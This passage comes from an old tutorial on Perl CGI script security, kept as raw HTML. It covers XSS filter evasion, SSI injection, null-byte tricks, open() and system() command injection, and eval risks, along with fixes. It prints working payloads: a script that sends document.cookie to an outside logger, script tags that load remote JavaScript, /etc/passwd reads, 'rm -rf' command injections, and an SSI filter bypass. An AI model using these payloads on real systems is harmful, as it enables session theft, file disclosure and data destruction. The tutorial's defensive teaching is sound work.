</font>
<pre><font color="white">	&lt;script src="http://b0iler.eyeonsecurity.net/nasty.js"&gt;&lt;/script&gt;<br>	&lt;layer src="http://b0iler.eyeonsecurity.net/nasty.js"&gt;&lt;/layer&gt;<br>	&lt;ilayer src="http://b0iler.eyeonsecurity.net/nasty.js"&gt;&lt;/ilayer&gt;<br>	&lt;style type=text/css&gt;@import url(http://b0iler.eyeonsecurity.net/nasty.js);&lt;/style&gt;<br>	&lt;link rel=stylesheet type="text/javascript" SRC="http://b0iler.eyeonsecurity.net/nasty.js"&gt;<br></font></pre>
<font color="white"><br>
As you can see, some of these don't even contain the string 'script'  in
any way.  There are many other ways of inserting javascript, and their  is
certain ways for each browser that only work for that browser.  So  stopping
them all is almost hopeless.  Incase you run into a script which  tries to
filter everyway of adding javascript, here are a few more ways which  can
often get by filters (also the frame, applet, object, embed tags and more):
 <br>
</font>
<pre><font color="white">	&lt;img src="javas<br>	cript:alert('xss');&gt; - line breaks and spaces can be used to evade filters.<br>	<br>	&amp;{alert('XSS')}; - works for netscape 4.x and can be used in many tags: &lt;br size="&amp;{alert('XSS')}"&gt;<br>	<br>	&lt;style type="text/javascript"&gt;alert('XSS');&lt;/style&gt; - using style tag instead of script.<br></font></pre>
<font color="white"><br>
Of course even more ways which javascript can be put in seemingly  innocent
tags by the way of on* events, css, or others <br>
</font>
<pre><font color="white">	&lt;img src="javascript:alert('XSS');"&gt; - javascript in an img tag<br>	&lt;body onload="alert('script')"&gt; - javascript in on onload event (there are other on* events).<br>	&lt;p style="left:expression(eval('alert(\'XSS\')'))"&gt; - css in a p tag<br></font></pre>
<font color="white"><br>
Don't forget that there is more client side scripting languages than  just
javascript.  Many clients support others, and many scripts don't  filter
for anything but javascript (also activex, java, flash, actionscript, and
 others). <br>
</font>
<pre><font color="white">	<br>	&lt;img src="vbscript:code here"&gt;<br>	&lt;img src="mocha:code here"&gt; <br></font></pre>
<font color="white"><br>
If that isn't enough to worry about, you also should be converting all  character
encoding to UTF-8 before doing any filtering for XSS.  Although  most clients
which visit your site might use one type of character encoding you  cannot
be sure of this.  And after all that, I am sure there are plenty  more ways
to evade XSS filtering.  Trying to stop XSS in scripts is  extremely complicated. 
It is hard to be sure you did not forget or miss  something without only
allowing safe characters or filtering all &lt; and &gt;  besides the ones
you are sure are safe.  You could also trust other's code  by using modules
that filter for XSS, check out  http://www.perl.com/pub/a/2002/02/20/css.html
for more on this. <br>
<br>
Cross  site scripting may be a hard thing to stop in scripts that print user
input to  the client, but here are a few things you can do to help minimize
the likely  hood of serious problems: <br>
<br>
Don't put any sensitive info in cookies.   This is way to easy for attackers
to get using XSS.  Putting username and  passwords in a cookie is never a
good form of security and should be advoided at  all costs.  Even if the
cookie is encrypted.  Many times the script  automaticly logs users in based
on their cookie, but the cookie is encrypted for  security.  This makes no
sense as once someone has the contents of the  cookie the security is completely
broken. <br>
 </font>
<ul>
 <font color="white">  </font>
  <li><font color="white">Don't print user input to .html pages or any file
which will be used to    print html.  This just makes it easier for attackers
to get people to    view the page with the malicious scripting.  And if the
page allows SSI    you are asking for trouble (see a few paragraphs down).<br>
    <br>
   </font></li>
  <li><font color="white">Don't allow users to change settings without having
to type in    password.  If you allow users to do something just based on
the fact that    they are logged then XSS can exploit the fact that they
are already logged in    to send them to a url or submit form data automaticly.
    <br>
    <br>
   </font></li>
  <li><font color="white">Don't print passwords, session ids, credit cards,
or anything sensitive in    the url, cookie, or html.  These things things
can be grabbed by the    scripting and sent to a logger.  Even if a user
is logged in try not to    print anything which other people should not see. 
A classic example of    this problem is having the users password in a form:
    <br>
    </font>
    <pre><font color="white">		your password is currently: PASSWD<br>		Change password:<br>		Retype new password:<br></font></pre>
    <font color="white"><br>
Things such as requesting a password to be emailed to them and then    exploitting
web based mail to read their inbox is a possibility.  Many    scripts over
look this and trust that once a user logs in they are the ones    doing everything.<br>
    <br>
   </font></li>
  <li><font color="white">Disable scripting on sites you which you are admin. 
It is too    dangerous and too hard to tell if you are secure from XSS or
from browser    exploits.  This means turning off the scripting ability in
your client    when you visit this site, since XSS is ran client side this
will stop any XSS    attacks on you.<br>
    <br>
    </font></li>
</ul>
<font color="white">Here are a few practical examples of how SSI  can be
dangerous.  The most common type of attack is a cookie stealing  attack which
takes your cookie and submits it to a CGI script. <br>
</font>
<pre><font color="white">	&lt;script&gt;document.location.replace('http://b0iler.com/logger.cgi?' + document.cookie);&lt;/script&gt;<br></font></pre>
<font color="white"><br>
If this is printted to the client's browser it will sent them to that  cookielogger.cgi
with the QUERY_STRING being their cookie for that domain.   This cookielogger.cgi
would be a simple script that logs whatever is inputted  into a logfile. 
Another common thing to do is attack people while they are  logged in.  Scripts
such as web based email or a content management system  like phpnuke allow
you to change your options, such as your password.  To  change your password
the javascript just needs to submit data to a script while  you are logged
in.  This is very easy to do and can takeover an account  instantly.  Leaving
the victem out in the cold, usually dumbfounded as to  what just happend.
<br>
<br>
There are almost unlimited ways javascript can be  used to make an attack. 
For more ways look at the thread in bugtraq  started on Mar 16 2002 by zeroboy@arrakis.es
<br>
<br>
<a href="http://online.securityfocus.com/archive/82/262341">http://online.securityfocus.com/archive/82/262341</a>
  <br>
<br>
The following are the replies which actually stat something true or  useful. 
Most posts in this thread were confusing XSS with remote file  writing, also
some things people said were just wrong.  But there are some  good ones.
<br>
<br>
<a href="http://online.securityfocus.com/archive/82/262346">http://online.securityfocus.com/archive/82/262346</a>
<br>
<a href="http://online.securityfocus.com/archive/82/262512">http://online.securityfocus.com/archive/82/262512</a>
<br>
<a href="http://online.securityfocus.com/archive/82/262957">http://online.securityfocus.com/archive/82/262957</a>
<br>
<a href="http://online.securityfocus.com/archive/82/263218">http://online.securityfocus.com/archive/82/263218</a>
<br>
<a href="http://online.securityfocus.com/archive/82/263406">http://online.securityfocus.com/archive/82/263406</a>
  <br>
<br>
I might get alot of flack for this, but I feel that XSS is currently  over
hyped.  People are sending advisories to bugtraq saying that sites and  scripts
are vulnerable to XSS when there is no real security concern.  I  feel that
XSS is only a valid security problem if it can be used to gain access  to
something protected.  Instead of blaming XSS for the problems, I would  blame
doing things which allow XSS to be abused.  Things such as storing  username
and passwords in cookies, allowing logged in users to access or changes  things
without resubmitting a password, or having the session id somewhere  accessable
to client side scripting.  Now I am not saying XSS isn't a  security problem,
but it requires another variable to be abused.  In many  instances XSS is
not a security concern at all, and other times when it is a  problem the
script should fix the other variables which XSS can abuse.   Many XSS attacks
require alot of social engineering to work, so exploitation is  trival. 
This is not a reason to say XSS isn't a problem, but it helps  people realize
that it isn't as big a threat as some people believe.  XSS  is just too common
a problem and too hard to stop, instead I suggest focusing on  keeping things
secure even if XSS is possible.  XSS is a security problem,  and it is being
abused everyday...  but currently people are going alittle  nuts about it. 
What I am trying to say is: don't just blame XSS as the  only problem when
you store username and passwords in the user's cookie, in this  case the
overall script design is poor. <br>
<br>
<br>
<br>
<b><a name="SSI"></a>
SSI</b><br>
           SSI stands for Server Side Includes, it is ment to  be a very
basic way to make your pages alittle more dynamic and easier to  maintain. 
You can include files to be printed to the client, execute  commands, and
even do a limitted amount of scripting with it.  Since SSI is  ran server
side it really isn't a cross site scripting problem at all, it is a  basic
file writing problem.  I am including it in this paper just to inform  people
who depend on SSI and any kind of scripting that they could be easily  attacked
with just a file writing exploit or bad permissions.  With SSI  enabled on
a webserver and a script prints user input to a page that allows SSI  then
there is a chance attackers can include files and execute commands when  they
view that page.  The syntax for an SSI include is: <br>
</font>
<pre><font color="white">	&lt;!--#include file="/etc/passwd" --&gt;<br></font></pre>
<font color="white"><br>
This would make the contents of the /etc/passwd file print on that  page
just like it was hard coded there.  The sure way to tell that SSI can  be
used on a page is the extention .shtml, but you never can tell for sure that
 .htm or .html files don't parse SSI.  It all depends on the webservers set
 up.  Any 'secure' site running SSI will have the command execution feature
 turned off, so things like this won't work: <br>
</font>
<pre><font color="white">	&lt;!--#exec cmd="rm -rf /home/you/www" --&gt;<br></font></pre>
<font color="white"><br>
Many scripts filter for this by using the following regex (it's pretty  much
the standard for filtering SSI): <br>
</font>
<pre><font color="white">	@pairs = split(/&amp;/, $ENV{'QUERY_STRING'});<br>	foreach $pair (@pairs) {<br>		($name, $value) = split(/=/, $pair);<br>		$value =~ s/&lt;!--(.|\n)*--&gt;//g;<br>		$FORM{$name} = $value;<br>	}<br></font></pre>
<font color="white"><br>
Now that $value =~ s/&lt;!--(.|\n)*--&gt;//g; is what is filtering  SSI. 
For the most part is works very well.  No encoding can be done  to get around
this since it is server side intrepreted and even line breaks  won't work
with SSI.  But if the user inputs two values which are both  printed to the
shtml page one after another? I have seen a few guestbooks and  message boards
that print things like "&lt;br&gt; $username $email  &lt;br&gt;&lt;br&gt;
$message &lt;br&gt;".  Where you could input username  as &lt;!-- and email
as #exec cmd="ls" --&gt; which would execute the command  ls.  Filtering
is a very important part of Perl security, always try to  imagine how you
could get past the filtering and still do what you want...   sometimes very
strange things will work perfectly and get past the  filters.  Let's see
that SSI filter again, it is supposed to stop &lt;!--  #anything --&gt; <br>
</font>
<pre><font color="white">	$value =~ s/&lt;!--(.|\n)*--&gt;//g;<br></font></pre>
<font color="white"><br>
now lets think about how we got around s/..\///g; by making the filter  change
the string into a bad string (making .../...// into ../)  Let's try  the
same thing here by submitting <br>
</font>
<pre><font color="white">	&lt;!-&lt;!-- #nothing --&gt;- #include file="/etc/passwd" --&gt;<br></font></pre>
<font color="white"><br>
Nope, this does not work, why?  Because perl's backticking  feature in regex
that finds the first part then starts searching from the end of  the string
for the rest.  So it finds the first &lt;!-- then goes to the  end and finds
the first --&gt;.  Making the string into just: &lt;!-  <br>
<br>
Let's step back for a second, is there any possible way of getting  around
this?  &lt;!-&lt;!-- --&gt;- #include file="/etc/passwd" -&lt;!--  --&gt;-&gt;
Won't work ether, since perl will again find the first &lt;!-- and  the last
--&gt; and replace it with nothing. <br>
<br>
I brainstormed for about 30  seconds for possible ways to get around this
filter.  I didn't really see  any besides that one I talked about earier
with using two variables side by side  ($ssivar1 $ssivar2).  So I hoped on
to a shell with ssi and did about 3  tests.  First one was to see if SSI
worked correctly.  Second was so  silly I don't wish to mention it.  And
the third and final test was: <br>
</font>
<pre><font color="white">	&lt;html&gt;<br>	&lt;body&gt;<br>	<br>	&lt;did it....<br>
	&lt;!-- #include file="testfile.txt" - -&gt;
	
	&lt;/body&gt;
	&lt;/html&gt;
</font></pre>
<font color="white"><br>
Which worked.  As you can see I just added a space in between the  two dashes
in --&gt;.  So now we can easily get around the SSI filter and  still execute
SSI on pages which are parsed by SSI.  Even sites that have  .html files
only still can be using SSI.  Many sites just do a 'AddHandler  server-parsed
.html' and keep the .html extention.  Some even do this just  so attackers
do not know all their pages are full of SSI.  If anyone runs  into problems
where a system does not work with the space between the two dashes  give
me an email, I only tested it on one box.  I have a few other ideas on  how
to evade this filter and still allow SSI to still be parsed, but I stopped
 when the space trick worked. <br>
<br>
<br>
<br>
<b><a name="NULL_Byte"></a>
NULL Byte</b><br>
           Ok, enough kids stuff.  Lets start to get serious with  perl and
exploitation.  This null byte problem is incredably serious and  very inventive. 
Who ever found this bug out deserves massive  respect.  The problem is that
\0 (or 00 in hex) is the NULL Byte, and perl  sees the NULL Byte as the NULL
character, but C does not.  And system calls  such as open() and exec() are
passed to the operating system.  Unix is  coded in C..  and the NULL Byte
in C is a string terminator.  Meaning  that the string stops when there is
a NULL Byte.  This probably doesn't  make much sense right now, but as always
the example will help you understand  (it's sad..  I code better than I speak)
<br>
</font>
<pre><font color="white">	#get input and put it into $file<br>	$file = $ENV{'QUERY_STRING'};<br>	#convert url encoding to ASCII (%00 will become the NULL Byte)<br>	$file =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;<br>	$filename = '/home/user/' . $file . '.txt';<br>	open(FILE, "&lt;$filename");<br></font></pre>
<font color="white"><br>
Now what does this script do? It takes $file and puts /home/user/  infront
of it and .txt at the end.  This is used to "make sure" the file  opened
is a.txt file.  But when you send something like script.cgi%00 to it  then
perl will send /home/user/script.cgi\0.txt to C which will see it as  /home/user/script.cgi
since it stops at the Null Byte.  So it will open  /home/user/script.cgi
instead of a .txt file.  This means you can do things  like ../../../../etc/passwd\0.
<br>
<br>
Many scripts do not filter the NULL Byte  and they depend on adding file
extentions to stop you from reading any file on  the system.  The fix is
as simple as $file =~ s/\0//g; After you convert  url encoding to ASCII,
please notice this.  A few scripts I've seen filter  null byte before they
convert url encoding to ASCII.  This is pretty much  pointless. <br>
<br>
Another type of functions which are commonly vulnerable to  this are when
a script allows uploads and checks to make sure the uploaded file  is a certain
file extention. <br>
<br>
<br>
<br>
<b><a name="Problems_With_open"></a>
Problems With  open()</b><br>
          If you didn't already know that  open(touch file.txt|); will run
the system command "touch file.txt" then now you  do.  And this is a major
problem in countless perl scripts.  Out of  all these security flaws in perl
code, this is the one I would like perl coders  to focus on.  It is overlooked
by many perl programmers and can easily be  spotted and exploited by attackers. 
I'd say it and reverse directory  transversal are the most exploited perl
coding there is for CGI.  Now lets  get right to the examples shall we? <br>
</font>
<pre><font color="white">	use CGI;<br>	$input=CGI-&gt;new();<br>	$file = $input-&gt;param('file');<br>	open(FILE, $file) or &amp;diehtml("cannot open that file");<br></font></pre>
<font color="white"><br>
Besides reverse directory transversal you can now see how this lack of  input
filtering cause be deadly.  If you go to  http://b0iler.eyeonsecurity.net/script.cgi?file=rm
-rf ./| the current directory  will be deleted! Not only is the pipe able
to make open(FILE $file) execute  commands but also open(FILE, "$file"). 
Of course open(FILE, '$file') will  not work since single quotes do not interprete
variables.  Also when you  specify what method of I/O you are using when
opening a file you cannot execute  commands.  Examples of vulnerable calls:
<br>
</font>
<pre><font color="white">	open(FILE, $file);                #$file = command|<br>	open(FILE, "$file");              #$file = command|<br>	open(FILE, "/home/user" . $file); #$file = /../../bin/command|<br>	open(FILE, $file . ".txt");       #$file = |command\0   the null byte is needed to chop off that .txt<br>	open(FILE, "$file.txt");          #$file = |command\0<br></font></pre>
<font color="white"><br>
The last two make use of the null byte.  Lets see another example  of vulnerable
code that uses the null byte. <br>
</font>
<pre><font color="white">	if(-e $file){<br>		open(FILE, "$file");<br>	}<br></font></pre>
<font color="white"><br>
now this gets tricky, the -e means exists, so the if is checking  weather
the file exists or not.  If it does exist it tries to open  it.  but the
file |command doesn't exist.  How about /bin/command?  That exists, now to
get perl to open() so that it will execute it instead of  reading it.  One
nice thing is that when perl checks if a file exists it  calls on the operating
system again, and since the operating system (*nix I  hope) is coded in C
the null byte works here.  Also when perl checks  weather it should execute
it or not it only checks the first character and the  last character in the
filename (open HANDLE FILENAME).  So we can set $file  to something like
/bin/command\0| and it will execute.  Perl will see the |  at the end and
execute the command, and the -e check will return true since C  will check
for /bin/command, stopping at the null byte.  But this is very  limitting
to the commands you are able to use since you cannot put any spaces or  other
characters in it. <br>
<br>
I don't really see any serious problems with  this, but to be safe just filter
any dangerous meta characters and specify how  you are opening files with
&lt; &lt;&lt; &gt; &gt;&gt;  The only problem I  see is a DoS - using up
tons of resources by running a lot of programs.   There might be a program
which could cause security concerns that doesn't  require any arguments.. 
but I am unaware of any installed by default.  <br>
<br>
The safest way to open a file for reading would be to use sysopen or the
 3 argument version of open.  These force you to specify what kind of mode
 these files are being opened in.  Here is an example of sysopen: <br>
</font>
<pre><font color="white">	require Fcntl;          #needed for the MODE parameter - in this case O_RDONLY<br>	sysopen(FILE, '/home/user/file', O_RDONLY);<br></font></pre>
<font color="white"><br>
sysopen is a more low level version of open, which doesn't have any  fancy
features such as '-' for STDIN/STDOUT, newline tricks, pipes to execute  commands,
or anything else..  it's just plain old open to read or  write.  An example
of open with 3 arguments.  As mentioned before when  you use &lt; &lt;&lt;
&gt; &gt;&gt; no commands can be executed by using pipes.  <br>
</font>
<pre><font color="white">	open(FILE, "&lt;", '/home/user/file');<br></font></pre>
<font color="white"><br>
The last open() problem I will go over is one I have only seen once,  but
I am sure exists in a few other scripts out there.  This is the use of  &gt;&amp;
as the mode will make the input/output the same as a previous  filehandle. 
This is a pretty limitted attack, but sometimes can be useful  if the script
filters for any other reverse directory transversal methods.   Take this
example: <br>
</font>
<pre><font color="white">	#pretend there is good filtering for $FORM{'user'}<br>	#stopping any reverse directory transversal or command execution.<br>	#the database is built like:<br>	#user1:password<br>	#user2:password<br>	#user3:password<br>	<br>	open(PWDFILE, '/home/user/not_www_readable/passwd');<br>	<br>	#put lines into #value, and go through each line.<br>	while(chomp($value = <pwdfile>)){<br>		#split the line up into username and password variables<br>		($username,$password) = split(/:/, $value);<br>		<br>		#check if the username and password match.<br>		if($FORM{'user'} eq $username &amp;&amp; $FORM{'password'} eq $password){<br>				$access = 1;<br>				allowaccess();<br>		}<br>	}<br>	#if the user failed to login then $access would not be set<br>	if(!$access){<br>		#append to the userfile..  if the userfile does not exist then create it.<br>		open(USERLOG, "&gt;&gt;$FORM{'user'}") or open(USERLOG, "&gt;$FORM{'user'}");<br>		print "$FORM{'user'} had an invalid login attempt\n";<br>		close(USERLOG);<br>	}<br>	close(PWDFILE);<br></pwdfile></font></pre>
<font color="white"><br>
This is kind of a poor example, since the close(PWDFILE); should be  before
the if(!$access) in a "proper" script, but many times open is called  multiple
times while another filehandler is still open from a previous  one.  This
is what I was trying to emulate as it was simular to the script  which I
found this vuln in. <br>
<br>
The problem here is if someone logs in with  the username of '&amp;PWDFILE'
they will fail logging in and the script will  attempt to log their failure
by opening a logfile for that username.  The  file &amp;PWDFILE does not
exist so it cannot append to it with: <br>
</font>
<pre><font color="white">	open(USERLOG, "&gt;&gt;$FORM{'user'}")<br></font></pre>
<font color="white"><br>
but the following is valid <br>
</font>
<pre><font color="white">	open(USERLOG, "&gt;&amp;PWDFILE");<br></font></pre>
<font color="white"><br>
Which will cause the script to overwrite  /home/user/not_www_readable/passwd
with "&amp;PWDFILE had an invalid login  attempt\n".  Now the attacker just
logs in with: username = '&amp;PWDFILE'  and password = '' and they get access. 
The person who coded this script  thought they stopped all reverse directory
transversal attacks, but since they  did not know all of perl's features
for open they left a door open for  attackers.  There is another spechial
convenient feature, which is  &amp;=.  It makes that filehandle an alias
for another one, this would  allow reading files, while &gt;&amp; allows
writing.  Keep your eye open  for these sorts of vulns, if anyone finds another
one I'd love to hear about  it.  Note, the same applies for '&gt;file' when
you use a bare open(FILE,  "$file").  The default mode is read-only, but
if $file is '&gt;file' then  it will create/overwrite 'files'.  So now we
know that open()'s without a  mode for i/o are vuln, and open()'s even with
a file i/o can be vuln...   only in perl folks. <br>
<br>
Bad open() calls are probably the easiest to find  for auditors, and easiest
to make for programmers.  Try to make it a habit  of using secure open()
calls even when the file isn't based on user input.   There are a few other
problems involving open I'll get to later in the paper.  <br>
<br>
<br>
<br>
<b><a name="Perl_Length_Limits"></a>
Perl Length Limits</b><br>
           I might aswell mention this here just because I haven't seen it
in any other  papers.  I have only seen this problem only a few times but
things like  this do exist and 99% of the perl coders out there never even
think about  it.  This is when perl limits filename sizes, variable sizes,
and limits  other such things which can effect how things in a script work. 
With this  example you can effect things such as -e check, open, unlink,
and other file  handling functions operate. <br>
<br>
The problem is simple, take this code as an  example, although long should
be simple enough for newbies to understand: <br>
</font>
<pre><font color="white">	#check for bad characters<br>	if($FORM{'path'} =~ m/\0|\r|\n/ig){ die "illegal characters"; }<br><br>	#check for .htaccess file in /home/user/accounts/$FORM{path}<br>	$htaccess = "/home/user/accounts/$FORM{user}/.htaccess";<br><br>	if(-e $htaccess){ <br>		#read .htaccess<br>		open(HTACCESS, "&lt;", $htaccess) or die "could not open .htaccess file";<br>		@lines = &lt;HTACCESS&gt;;<br>		close(HTACCESS);<br>	<br>		#get username and password<br>		($correctuser,$correctpassword) = split(/:/,$lines[0]);<br>	<br>		#check if they are right, give access<br>		if($FORM{'user'} eq $correctuser &amp;&amp; $FORM{'pass'} eq $correctpassword){<br>			print "access granted";<br>			access();<br>		}<br>		else{   print "access denied"; }<br>	}<br>	#if the .htaccess does not exist then create a new account.<br>	else{<br>		#makes the directory       <br>		#error unless the directory already exists <br>		#if it exists than the script thinks it is just missing a .htaccess<br>		mkdir($FORM{'user'},0755) or die "error accessing user directory" unless (-d $FORM{user});<br>	<br>		#create .htaccess file and print username:password  <br>		#this should be encrypted but it is just an example.<br>		$accessfile = $FORM{'user'} . "/.htaccess";<br>		open(USERACCESS, "&gt;", $useraccess) or die "could not create user file";<br>		print USERACCESS "$username:$password";<br>		close(USERACCESS);<br>	}<br></font></pre>
<font color="white"><br>
So what does this code do? It will check if  /home/user/accounts$FORM{'path'}/.htaccess
exists, if it does it will check the  submitted username and password against
the real one.  If it doesn't exist  then it will create a new user directory
and a .htaccess in it with the  submitted username and password.  This looks
secure from all the previous  types of attacks, but because perl limits filename
sizes to around 2050 bytes  (atleast that is what it is on my box) it can
be exploited. <br>
<br>
So lets say  someone has the account with the username of admin.  Their home
directory  would be /home/user/accounts/admin/ and their username:password
would be in  /home/user/accounts/admin/.htaccess usually this would protect
people from  accessing this directory.  But if an attacker submits  ././././././././././././[another
2000 bytes of this]./././admin as $FORM{'user'}  there is trouble.  The attacker
will need to make  ././././[etc]./././admin/.htaccess a valid length so that
the .htaccess file is  created when the script does open(USERACCESS, "&gt;"
$useraccess) but will fail  the if(-e $htaccess) when another 20 bytes are
added from the  '/home/user/accounts/'. <br>
<br>
There are other possible ways to exploit scripts  based on how perl sets
size limits, this is a very tricky thing to find and even  harder to remind
yourself of these limits while coding.  Best stratigy is  to limit sizes
of all input to a reasonable length (few hundred characters) and  be very
aggressive when checking if files/values exist.  I would also  suggest using
sysopen instead of open, take this for example: <br>
</font>
<pre><font color="white">	sysopen(FILE, $file, O_WRONLY | O_CREAT);<br></font></pre>
<font color="white"><br>
No need to worry about perl's length restrictions as sysopen will not  overwrite
a file.  Also helps those silly race conditions that old perl  versions have.. 
not really a CGI problem though.  You can easily  check what your perl limits
filenames to by doing something like this: <br>
</font>
<pre><font color="white">	linux:~ # perl -e 'while(1){$n++;unless(-e "./" x $n){ die "perl sets limit at " . (--$n);}}'<br></font></pre>
<font color="white"><br>
This will tell you the limit on the number of characters perl allows  before
it cannot open, unlink, check for existance, or any other simular file  handling
functions.  I'd be interested in hearing if anyones is way off  from 2050
(b0iler@hotmail.com) or if this is a constant value.  Also if  anyone else
can think of a way to abuse other perl limits, I have found a  few..  but
they seem too high to exploit or there is no situation where  they would
cause a problem. <br>
<br>
<br>
<br>
<b><a name="System_Commands"></a>
System Commands</b><br>
           These are a big time threat if not filtered  correctly and they
take in arguments which are based on user input.  Perl  is used by many as
a way of calling apon different programs and then tieing the  output together. 
This can be very dangerous if the same idea is used when  coding CGI scripts. 
The security problem here is that you could be giving  the attacker a clear
shot at executing commands.  The two basic functions  for executing system
commands in perl are exec() and system().  They both  work just like as if
you were at the command prompt.  You first type the  program to run, followed
by the arguments to this command.  You can also  use pipes and redirect i/o
with both of these.  So lets say you have this  in a script: <br>
</font>
<pre><font color="white">	system('cat file.txt');<br></font></pre>
<font color="white"><br>
That is fine.  No real security risk there.  But if you call  system() with
a arugment inputted from a user. <br>
</font>
<pre><font color="white">	system("cat $ENV{'QUERY_STRING'}");<br></font></pre>
<font color="white"><br>
Then the user can define any file the script has permission to  read.  Might
not be a big deal, just filter reverse directory transversal  and add a ./
infront of $ENV{'QUERY_STRING'} right? no.  Something like  this is still
extremely vulnerable: <br>
</font>
<pre><font color="white">	$input = $ENV{'QUERY_STRING'};<br>	$input = s/\\//;<br>	$input = s/..//;<br>	system("cat ./$file");<br></font></pre>
<font color="white"><br>
It may stop reverse directory transversal, but we forgot that the cat  command
can take multiple arguments.  Something like cat file.txt  /etc/passwd would
still work and get past our reverse directory transversal  filters.  We need
really strict filters in place so that the script can  only read files from
the current directory.  Which of course includes this  script's source, remember
to filter this aswell.  You can use $0 to get the  name of the current script. 
After you have completely stopped reverse  directory transversal it does
not stop the attacker from piping multiple  commands through this system()
call.  Many scripts will filter the  character ";" and think their system
calls are safe.  There is also the "|"  character to be worried about.  So
if you see this filter you know you can  evade it with the |. <br>
</font>
<pre><font color="white">	$input = $ENV{'QUERY_STRING'};<br>	$input = s/\\//;<br>	$input = s/..//;<br>	$input = s/;//;<br>	system("cat ./$file");<br></font></pre>
<font color="white"><br>
script.cgi?file.txt|cat /etc/passwd would work against the  above.  So this
would be safe right? <br>
</font>
<pre><font color="white">	$input = $ENV{'QUERY_STRING'};<br>	$input =~ s/\\//;<br>	$input =~ s/..//; #this is a poor filtering, read next section to see why<br>	$input =~ s/;//;<br>	$input =~ s/\|//;<br>	$input =~ s/^\///; #stops /full/path/attacks<br>	system("cat $file");<br></font></pre>
<font color="white"><br>
It filters reverse directory transversal and the two pipes we talked  about. 
So attackers cannot do any of the following <br>
</font>
<pre><font color="white">	script.cgi?/etc/passwd <br>	script.cgi?../../../../etc/passwd <br>	script.cgi?file.txt;cat /etc/passwd<br>	script.cgi?file.txt|cat /etc/passwd<br></font></pre>
<font color="white"><br>
But still it is not safe.  There are the i/o redirecting  characters &gt;
&gt;&gt; and &lt; &lt;&lt; which need to be filtered or things  like this
can be done: script.cgi?&lt;/etc/passwd Again bypassing our reverse  directory
transversal filters and getting the file they want.  You need to  be extremely
carefull when dealing with files and letting users specify the  directory
or filename to files can be very dangerous.  Make sure you filter  extremely
well, or only allow the good characters. <br>
<br>
Now I said system()  and exec() work just like a shell, they don't really
work exactly like  them.  Only if there is a shell metacharacter in the call
does system()  send it to the shell.  Otherwise perl can parse this itself
and call  execvp() instead.  If perl sees a shell meta character in the data
passed  to system() then it must execute this through the shell so it can
handle what to  do with the meta characters.  Just like the open() function
perl allows for  a more safe way to make this call with multiple arguments. 
Take this for  example: <br>
</font>
<pre><font color="white">	system("cat", "/home/user/$ENV{'QUERY_STRING'}");<br></font></pre>
<font color="white"><br>
Normally with system("cat /home/user/$ENV{'QUERY_STRING'}") the  QUERY_STRING
could contain a metacharacter and would get sent to the shell for  processing. 
but with the example above perl sends cat as the command and  /home/user/$ENV{'QUERY_STRING'}
as the argument.  This stops from attacks  like: file;rm -rf /home/user/
where a meta character is used to issue multiple  commands or do something
the script is not meant to do.  Now that we got  reverse directory transversal
and metacharacters taken care of system() calls  are safe, right?  Not quite. 
Anything you do in perl you must  completely understand, like how the open()
can make filehandles aliases for  others with &amp;=, most people do not
know this and therefore they do not  prevent against this being exploited. 
Same applies for calling programs  from within your scripts, if you don't
know a feature of it..  you cannot  filter against it being exploited.  One
such feature is found in the unix  mail program, this feature allows users
to execute commands via the shell with  ~!.  So filtering this is very important,
but if you blindly call upon the  shell to execute programs then the programs
features may be exploited.   Make sure to research any programs you are calling
and know all of it's features  before sending user input to it. <br>
<br>
The use of open(HANDLE, "command|"); as  stated before can also be used to
issue commands.  There is a bad side to  using this method as the commands
get sent to the shell.  So to avoid this  we make open() not call the shell
with '-|' and '|-'.  The first one, -|,  is for reading the output of the
command, and the second one, |-, is used to  send data to a command.  The
- means STDIN or STDOUT, with the | it  executes a command.  Here is an example:
<br>
</font>
<pre><font color="white">	open(READ, "-|", "cat", "/home/user/$FORM{'file'}");<br>	@lines = <read>;<br></read></font></pre>
<font color="white"><br>
This would execute the cat command with the argument of  /home/user/$FORM{'file'}. 
Maybe I should also tell you that you cannot  both read and write to a command,
so things like |command| are illegal.   This is the method I prefer for opening
a shell for writing/reading: <br>
</font>
<pre><font color="white">	open(WRITE, "|-") || exec("/bin/command", "$FORM{'file'}");<br>	print WRITE 'this is piped to /bin/command, which handles the data.';<br></font></pre>
<font color="white"><br>
This will allow you to print to the program without having to open a  shell.
<br>
<br>
Another common way to execute commands in perl is the use of  backticks:
`command` just like in the shell the backticks means to execute this  command
and return the results.  This may look like a single quote, but it  isn't. 
The backtick is located to the left of the 1 key on every keyboard  I've
seen.  This will execute the command and return the output to be put  in
a variable (or anything else you want to do with it).  There is also the
 qx// which works the same as the backticks.  Here is an example: <br>
</font>
<pre><font color="white">	$file = `cat /home/user/$FORM{'file'}`;<br>	print "the contents of $FORM{'file'} is:\n\n $file";<br></font></pre>
<font color="white"><br>
the qx// would be $file = qx(cat /home/user/$FORM{'input'}); #using ()  just
so I don't have to escape the /'s.  Not much to say about the  backticks
besides that they do not return any errors, just whatever the program  prints
to STDOUT.  If what the program prints is an error, then this will  get returned.
<br>
<br>
<br>
<br>
<b><a name="Evaluating_User_Input"></a>
Evaluating User Input</b><br>
           I am very sorry, but I will not be covering how to handle  insecure
perl from user input.  This topic is pretty lenghy and does not  apply to
many people, so if you would like to learn about that try the security  section
of "Programming Perl".  Sorry if this section is short, I just kind  of threw
it on at the end. <br>
<br>
eval() is a function which will interpret  anything passed to it as perl. 
This can be very dangerous since perl can  give attackers so much power over
a machine.  If an eval took pure user  input and sent it to eval() the attacker
could easily exploit it.  Here is  an example of how eval() works: <br>
</font>
<pre><font color="white">	$code = 'print "hello world\n";';<br>	eval($code);<br></font></pre>
<font color="white"><br>
This would make the string 'print "hello world\n";' get parsed by  perl,
printting "hello world\n".  Since anything can be sent to eval()  things
like system(), exec() and other system command functions can be used to  make
a poor eval() call into a virtual shell for the attackers.  When  handling
code that must be eval()'d you need to be extra sensitive for possible  security
problems.  Treat it as dangerous as a system() call, maybe even  more dangerous. 
The /e is a regex modifier which is used to evaluate a  regular expression
before running it.  eval() isn't the most commonly used  function in CGI,
but I've seen it abused many times.  Even with good input  filtering it is
hard to stop all the possible dangers in perl.  I would  suggest using eval()
as little as possible, espechialy with user input.  <br>
<br>
Lesser used functions which need to be carefull to not accept user input
 are require and do.  I cannot think of any others which you need to be  careful
with, I know more exist, email me if you know of some.  <br>
<br>
<br>
<br>
<b><a name="Poor_Input_Filtering"></a>
Poor Input Filtering</b><br>
           This section might seem a bit repetitive since I have been going
over  problems in filtering and what to filter all along, but filtering user
